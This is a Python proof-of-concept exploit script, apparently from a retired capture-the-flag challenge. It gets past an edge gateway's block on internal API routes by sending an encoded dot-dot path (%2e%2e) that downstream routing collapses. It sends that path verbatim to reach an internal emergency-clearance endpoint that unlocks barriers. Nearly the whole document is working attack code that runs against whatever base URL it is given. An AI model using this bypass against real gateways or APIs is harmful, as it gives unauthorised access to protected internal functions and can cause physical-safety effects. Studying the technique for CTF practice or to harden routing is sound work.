#!/usr/bin/env python3
"""Northern Viaduct Emergency Clearance — PoC.

Exploit: the edge gateway blocks paths beginning with /api/v1/internal/ on the
raw path prefix, but downstream routing decodes %2e%2e and collapses the
dot-dot segment, resolving /api/v1/consignments/%2e%2e/internal/dispatch/emergency-clearance
to the internal supervisor endpoint. requests/urllib3 would re-quote or
collapse the path, so http.client is used to send the path verbatim
(equivalent to curl --path-as-is).

Usage:
    python3 corridor.py [base_url]

The CTF instance is retired; this PoC documents the exploit path and does not
contact any live service.
"""

import http.client
import json
import sys
import urllib.parse

CONSIGNMENT_ID = "CTLD-FR-8821"
REASON = "Authorized emergency viaduct escort"
BYPASS_PATH = "/api/v1/consignments/%2e%2e/internal/dispatch/emergency-clearance"


def request(conn: http.client.HTTPConnection, method: str, path: str,
            body: str | None = None, headers: dict | None = None):
    conn.request(method, path, body=body, headers=headers or {})
    resp = conn.getresponse()
    data = resp.read().decode(errors="replace")
    return resp.status, data


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
    url = urllib.parse.urlsplit(base)
    conn_cls = http.client.HTTPSConnection if url.scheme == "https" else http.client.HTTPConnection
    conn = conn_cls(url.hostname, url.port, timeout=15)

    print(f"[*] recon: GET /api/v1/consignments/{CONSIGNMENT_ID}")
    status, body = request(conn, "GET", f"/api/v1/consignments/{CONSIGNMENT_ID}")
    print(f"    -> {status} {body[:300]}")

    print("[*] direct access to the internal route is blocked at the edge")
    status, body = request(
        conn, "POST", "/api/v1/internal/dispatch/emergency-clearance",
        body=json.dumps({"consignment_id": CONSIGNMENT_ID, "reason": REASON}),
        headers={"Content-Type": "application/json"},
    )
    print(f"    -> {status} {body[:300]}")  # expected: GW_ACL_INTERNAL_ROUTE_PROHIBITED

    print(f"[*] bypass: POST {BYPASS_PATH}")
    status, body = request(
        conn, "POST", BYPASS_PATH,
        body=json.dumps({"consignment_id": CONSIGNMENT_ID, "reason": REASON}),
        headers={"Content-Type": "application/json"},
    )
    print(f"    -> {status}")
    print(body)  # expected: emergency clearance + barrier unlock confirmation
    conn.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
